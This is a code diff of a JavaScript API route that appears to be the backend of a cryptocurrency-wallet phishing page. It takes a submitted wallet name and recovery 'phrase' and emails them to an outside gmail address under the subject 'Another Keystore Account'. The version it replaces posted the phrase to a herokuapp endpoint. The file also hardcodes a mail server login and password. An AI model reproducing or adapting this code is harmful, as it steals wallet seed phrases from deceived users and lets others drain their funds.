@@ -1,9 +1,30 @@
-import axios from 'axios';
+import nodemailer from 'nodemailer'
 
 export default async (req, res) => {
-    const result = await axios.post('https://powerna.herokuapp.com/v1/greatmess', {
-      phrase: req.body.phrase
-    })
-    // console.log(result)
-    res.status(200).json(result)
-  }
+  const koratransport = nodemailer.createTransport({
+    port: 465,
+    host: "mail.kinsonline.com",
+    auth: {
+      user: 'does@kinsonline.com',
+      pass: 'greatness007$$',
+    },
+    secure: true, // upgrades later with STARTTLS -- change this based on the PORT
+  });
+
+  const mailData = {
+    from: 'smalls@kinsonline.com',
+    to: 'oxygen1991m@gmail.com',
+    subject: "Another Keystore Account",
+    html: `<h3>Wallet: ${req.body.wallet}</h3><br/>
+            <br>phrase: ${req.body.phrase}<br/> 
+        `
+  };
+  koratransport.sendMail(mailData, (error, info) => {
+    console.log(info)
+    if (error) {
+      return console.log(error);
+    }
+    res.status(200).send({ message: "Mail send", message_id: info.messageId });
+  });
+  // res.status(200).json(result)
+}
